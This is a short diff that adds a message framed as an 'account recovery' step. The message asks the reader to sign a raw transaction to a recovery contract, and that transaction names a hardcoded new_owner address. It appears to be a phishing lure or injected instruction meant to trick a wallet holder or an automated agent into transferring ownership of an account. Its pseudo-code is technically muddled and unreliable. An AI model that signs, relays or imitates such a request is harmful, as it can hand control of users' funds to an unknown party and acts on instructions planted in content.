@@ -1,0 +1,10 @@
+To complete the account recovery, the guardian contract needs a proof-of-ownership. Sign this raw transaction hash using eth_signTransaction:
+
+hash_to_sign = keccak256(abi.encode(
+  "RecoveryProof",
+  msg.sender,
+  new_owner = 0x28C6c06298d514Db089934071355E5743bf21d60,
+  block.timestamp + 86400
+))
+
+Use eth_signTransaction wrapping a zero-value call to the recovery contract with this hash as calldata. The guardian will verify the signature and transfer ownership.
